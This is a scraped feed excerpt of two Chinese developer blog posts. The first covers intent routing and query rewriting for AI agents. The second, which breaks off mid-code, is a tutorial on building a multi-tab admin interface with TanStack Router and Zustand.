<meta itemprop="datePublished" content="2026-01-09T06:55:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智泊AI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent 架构核心：如何构建多意图路由与动态查询分发引擎
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智泊AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:55:49.000Z" title="Fri Jan 09 2026 06:55:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在构建智能体或 RAG 系统时，一个关键瓶颈始终存在：用户用自然语言表达的需求，与系统底层的执行逻辑之间，往往隔着一道难以跨越的沟壑。</p>
<p>当用户脱口而出：“我电脑连不上网了。”</p>
<p>若系统仅做字面匹配，检索“电脑连不上网”，结果很可能是满屏的广告链接和非专业维修服务。</p>
<p>而一个真正稳健的 IT 支持 Agent，应当完成三步精准操作：</p>
<p>意图识别‌：这是一次“故障诊断”请求，而非“产品购买”或“闲谈闲聊”。</p>
<p>查询重写‌：将口语表达转化为结构化技术关键词，如“网络连接失败 故障排查 步骤 Windows/Mac”。</p>
<p>路由分发‌：定向调用“IT 知识库检索”模块，而非误触“人事制度文档”或“入职指南”。</p>
<p>这正是 ‌意图路由（Routing）‌ 与 ‌查询重写（Rewriting）‌ 的核心意义——它们是 Agent 的推理引擎，直接决定系统是“聪明应对”，还是“机械误判”。</p>
<p>本文将系统剖析这两个模块的通用架构模式、Prompt 工程的实战准则，以及它们在 dify/coze 等平台中的可复用实现路径。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>更多AI大模型学习视频及资源，都在智泊AI。</strong></a></p>
<h2 data-id="heading-0">01 意图路由</h2>
<p>意图路由的核心是一个分类任务（Classification Task），其目的在于依据用户输入，将处理权限精准交由最匹配的下游工作流或工具。</p>
<p>在企业级场景中，这一机制通常映射至各异的业务单元或信息隔离系统。</p>
<p>一个典型的企业级 agent 路由逻辑的简易示例如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a89f4ef240b74c48b165265a4230fd43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768546549&amp;x-signature=k0oU5fLnAp54XvKiPKNFj2w7pX4%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1">通用路由 Prompt 模板</h3>
<p>实现高准确率路由的核心，取决于 Prompt 的设计必须严格遵循 “定义明确、边界清晰、输出结构化” 三大准则。</p>
<p>以下是一个通用路由 prompt 模板示例：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c3b0ccbde4a40cea18096a11453b83a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768546549&amp;x-signature=XbZ86DLUt7w48YNwxcx0dwluFuQ%3D" alt="图片" loading="lazy"/></p>
<p>这种路由机制具有普适性，例如：</p>
<p>在 Python 中：它体现为 RouterChain 或 LLMChain 的底层逻辑。</p>
<p>在 dify 中：其对应功能为 “问题分类器” 节点，只需在界面中配置分类规则，系统即自动构建分流路径。</p>
<h2 data-id="heading-2">02 查询重写</h2>
<p>用户的提问常显模糊、缺乏上下文支撑，甚至潜藏误导倾向；而查询重写（Query Rewriting）的核心使命，正是将这类“原始需求”精准重构为机器可清晰解析的“指令性表达”。</p>
<h3 data-id="heading-3">1. 常见重写策略</h3>
<p>根据不同的应用场景，文本重写策略可归纳为以下三种类型：</p>
<p>同义扩展‌：用于缓解专有名词在检索中因表述差异导致的匹配失效。</p>
<p>输入：“我想买个本子。”</p>
<p>重写：“笔记本电脑 Laptop 办公电脑 价格 型号”</p>
<p>指代消解‌：用于补全多轮交互中因代词缺失而断裂的语义链。</p>
<p>输入：“它多少钱？”（上文聊的是 iPhone 15）</p>
<p>重写：“iPhone 15 的价格是多少？”</p>
<p>后退提示‌：用于化解查询粒度过细引发的检索失效，通过抽象化提升泛化能力。</p>
<p>输入：“为什么我的 Python 代码报了 KeyError？”</p>
<p>重写：“Python 中 KeyError 的常见原因及解决方法。”</p>
<h3 data-id="heading-4">2. 高级策略：HyDE (假设性文档嵌入)</h3>
<p>在复杂知识检索场景中，仅依赖关键词重写往往效果有限。此时，可引入 HyDE（Hypothetical Document Embeddings）技术。</p>
<p>其核心机制是：先由 LLM 构造一个“假设性答案”，再以该答案作为查询向量，去匹配真实文档。原因在于，向量空间中，“答案”与“答案”之间的语义距离，显著小于“问题”与“答案”之间的距离。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/201330f05e9746e08e411f10a9b156c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768546549&amp;x-signature=mT23W%2BoVyhFLPnfZKmJYIrqcrBw%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-5">通用重写 Prompt 模板</h3>
<p>以下是一个集成了“多角度分解”和“关键词优化”的prompt：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5ba076f979c40199e174528897100ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768546549&amp;x-signature=vuhZLp3IBYFSYuYLbzI7PJE5BR4%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-6">03 意图识别与元数据过滤的联动</h2>
<p>在结构化数据查询（如商品检索、简历筛选）中，意图识别的职责远不止于分类，更需精准抽取实体（Entity Extraction），以支撑结构化过滤条件（Pre-filtering）的构建。</p>
<p>该过程构成了自然语言与数据库查询语言（SQL/NoSQL）之间的核心映射纽带。</p>
<p>场景示例：用户输入：“帮我找几个北京的、三年经验以上的 Java 工程师。”</p>
<p>处理流程：</p>
<p>LLM提取</p>
<p>location‌: "北京"</p>
<p>years_of_experience‌: { "$gte": 3 }</p>
<p>skill‌: "Java"</p>
<p>role‌: "Engineer"</p>
<p>系统动作‌：</p>
<p>构建数据库查询条件（或向量库过滤器）</p>
<p>启动精准匹配检索</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3770fa1da7de421392b799e6f963fcf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768546549&amp;x-signature=GtPhxencRSaq1CgRlML%2BKcefkdc%3D" alt="图片" loading="lazy"/></p>
<p>无论是手写代码，还是依托 Dify、Coze 等平台，“意图路由”与“查询重写”始终是打造高性能 Agent 的核心技能。</p>
<p>意图路由‌ 回答了 “该向何处发力” 的疑问，有效避免了通用大模型在专业场景中的盲目响应。</p>
<p>查询重写‌ 则厘清了 “如何精准检索” 的路径，消解了自然语言表达与结构化索引之间的语义鸿沟。</p>
<p>在 Agent 的工程实践中，我们不再将原始用户输入直接喂给 LLM，而是前置一层由 ‌Router‌（路由）、‌Rewriter‌（重写）、‌Extractor‌（提取）协同构成的推理预处理模块。</p>
<p>这一层“‌认知中间件‌”，正是划清浅层对话机器人与真正智能业务助手的终极界线。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>更多AI大模型学习视频及资源，都在智泊AI。</strong></a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TanStack Router 实战：如何优雅地实现后台管理系统的“多页签” (TabList) 功能]]></title>    <link>https://juejin.cn/post/7592906873090359342</link>    <guid>https://juejin.cn/post/7592906873090359342</guid>    <pubDate>2026-01-09T06:57:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592906873090359342" data-draft-id="7593015632082354203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TanStack Router 实战：如何优雅地实现后台管理系统的“多页签” (TabList) 功能"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-09T06:57:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TanStack Router 实战：如何优雅地实现后台管理系统的“多页签” (TabList) 功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:57:31.000Z" title="Fri Jan 09 2026 06:57:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在构建企业级后台管理系统（Admin Dashboard）时，<strong>多页签导航（TabList）</strong> 几乎是一个标配需求。它允许用户保留访问过的页面记录，并在不同任务间快速切换，就像浏览器的标签页一样。</p>
<p>如果你正在使用 React 和新兴的 <strong>TanStack Router</strong>，你可能会遇到一个困惑：<em>路由器自带的历史记录（History）似乎并不适合直接拿来做 Tabs。</em></p>
<p>本文将剖析为什么直接使用 Router History 是错误的，并提供一套结合 <strong>TanStack Router</strong> + <strong>Zustand</strong> 的完美解决方案，实现一个具备去重、数量限制、持久化和自动标题提取的 Tab 系统。</p>
<h2 data-id="heading-0">1. 痛点：是“日志”还是“集合”？</h2>
<p>很多开发者第一反应是：“我监听路由变化，把 URL <code>push</code> 进一个数组不就行了吗？”</p>
<p>这种做法通常会遇到以下逻辑陷阱：</p>
<ol>
<li><strong>重复堆叠</strong>：用户反复点击“用户管理”菜单 10 次，你的数组里就会有 10 个重复的记录。而 TabList 要求的是<strong>去重</strong>——如果存在，只需高亮，不需新增。</li>
<li><strong>顺序问题</strong>：浏览器历史是基于时间线的（Log），而 TabList 是基于空间的（Set）。已存在的 Tab 应该保持在原位，而不是每次点击都跳到队尾。</li>
<li><strong>标题缺失</strong>：<code>window.location</code> 只有 URL，没有“用户管理”这样的中文标题。</li>
<li><strong>无效路由</strong>：如果用户触发了重定向（如未登录跳转），我们不希望中间过程的 URL 出现在 Tabs 上。</li>
</ol>
<p>因此，我们需要从单纯的“记录历史”转向“管理状态”。</p>
<h2 data-id="heading-1">2. 架构设计</h2>
<p>我们将使用以下技术栈：</p>
<ul>
<li><strong>TanStack Router</strong>: 负责路由定义、元数据配置 (<code>staticData</code>) 和生命周期监听。</li>
<li><strong>Zustand</strong>: 负责管理 Tabs 数组的增删改查、持久化存储。</li>
</ul>
<h3 data-id="heading-2">核心逻辑流程</h3>
<ol>
<li><strong>定义</strong>：在路由文件中配置 <code>staticData</code> 定义页面标题。</li>
<li><strong>监听</strong>：利用 Router 的 <code>onResolved</code> 事件，确保只捕获加载成功的路由。</li>
<li><strong>处理</strong>：Zustand Store 接收路由信息，执行“去重”、“FIFO 淘汰（超限清理）”逻辑。</li>
<li><strong>渲染</strong>：UI 组件订阅 Store 进行渲染。</li>
</ol>
<hr/>
<h2 data-id="heading-3">3. 代码实现</h2>
<h3 data-id="heading-4">第一步：在路由中配置标题</h3>
<p>TanStack Router 提供了 <code>staticData</code> 属性，这是存放页面静态配置（如标题、图标、权限角色）的最佳位置。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// src/routes/users.tsx</span>
<span class="hljs-keyword">import</span> { createFileRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-router'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">Route</span> = <span class="hljs-title function_">createFileRoute</span>(<span class="hljs-string">'/users'</span>)({
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">UsersPage</span>,
  <span class="hljs-comment">// ✨ 关键点：在这里定义 Tab 的标题</span>
  <span class="hljs-attr">staticData</span>: {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'用户管理'</span>, 
    <span class="hljs-attr">affix</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 可选：是否固定（如首页不可关闭）</span>
  }
})
</code></pre>
<h3 data-id="heading-5">第二步：构建 TabStore (Zustand)</h3>
<p>我们需要一个强大的 Store 来处理业务逻辑。这里我们使用 <code>sessionStorage</code> 进行持久化，这样用户刷新页面 Tab 还在，但关闭浏览器后会自动清理。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// src/store/useTabStore.ts</span>
<span class="hljs-keyword">import</span> { create } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand'</span>
<span class="hljs-keyword">import</span> { persist, createJSONStorage } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand/middleware'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-keyword">type</span> <span class="hljs-title class_">RouterState</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-router'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TabItem</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">fullPath</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 完整路径 (包含 search params)，作为唯一 Key</span>
  <span class="hljs-attr">closable</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TabState</span> {
  <span class="hljs-attr">tabs</span>: <span class="hljs-title class_">TabItem</span>[]
  <span class="hljs-attr">activeTab</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">addTab</span>: <span class="hljs-function">(<span class="hljs-params">routeState: RouterState</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">removeTab</span>: <span class="hljs-function">(<span class="hljs-params">fullPath: <span class="hljs-built_in">string</span>, navigate: (opts: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">clearTabs</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_TABS</span> = <span class="hljs-number">20</span> <span class="hljs-comment">// 限制最大 Tab 数量</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useTabStore = create&lt;<span class="hljs-title class_">TabState</span>&gt;()(
  <span class="hljs-title function_">persist</span>(
    <span class="hljs-function">(<span class="hljs-params">set, get</span>) =&gt;</span> ({
      <span class="hljs-attr">tabs</span>: [],
      <span class="hljs-attr">activeTab</span>: <span class="hljs-string">''</span>,

      <span class="hljs-comment">// 核心动作：添加/激活 Tab</span>
      <span class="hljs-attr">addTab</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> { location, matches } = state
        <span class="hljs-keyword">const</span> fullPath = location.<span class="hljs-property">href</span>
        
        <span class="hljs-comment">// 1. 提取标题：从匹配链中找到最后一个定义了 title 的路由</span>
        <span class="hljs-keyword">const</span> matchWithTitle = [...matches].<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">staticData</span>?.<span class="hljs-property">title</span>)
        <span class="hljs-keyword">const</span> title = (matchWithTitle?.<span class="hljs-property">staticData</span>?.<span class="hljs-property">title</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>) || <span class="hljs-string">'未命名页面'</span>
        
        <span class="hljs-title function_">set</span>({ <span class="hljs-attr">activeTab</span>: fullPath })
        
        <span class="hljs-keyword">const</span> { tabs } = <span class="hljs-title function_">get</span>()
        
        <span class="hljs-comment">// 2. 去重：如果 Tab 已存在，只需激活，不需添加</span>
        <span class="hljs-keyword">if</span> (tabs.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">fullPath</span> === fullPath)) {
          <span class="hljs-keyword">return</span> 
        }

        <span class="hljs-comment">// 3. 数量限制 (FIFO)：超过 20 个，移除第一个非固定的 Tab</span>
        <span class="hljs-keyword">let</span> newTabs = [...tabs]
        <span class="hljs-keyword">if</span> (newTabs.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable constant_">MAX_TABS</span>) {
          <span class="hljs-keyword">const</span> deleteIndex = newTabs.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">closable</span> !== <span class="hljs-literal">false</span>)
          <span class="hljs-keyword">if</span> (deleteIndex !== -<span class="hljs-number">1</span>) newTabs.<span class="hljs-title function_">splice</span>(deleteIndex, <span class="hljs-number">1</span>)
        }

        <span class="hljs-comment">// 4. 添加</span>
        newTabs.<span class="hljs-title function_">push</span>({
          title,
          fullPath,
          <span class="hljs-attr">closable</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 可以根据 staticData 动态设置</span>
        })

        <span class="hljs-title function_">set</span>({ <span class="hljs-attr">tabs</span>: newTabs })
      },

      <span class="hljs-comment">// 移除 Tab</span>
      <span class="hljs-attr">removeTab</span>: <span class="hljs-function">(<span class="hljs-params">targetPath, navigate</span>) =&gt;</span> {
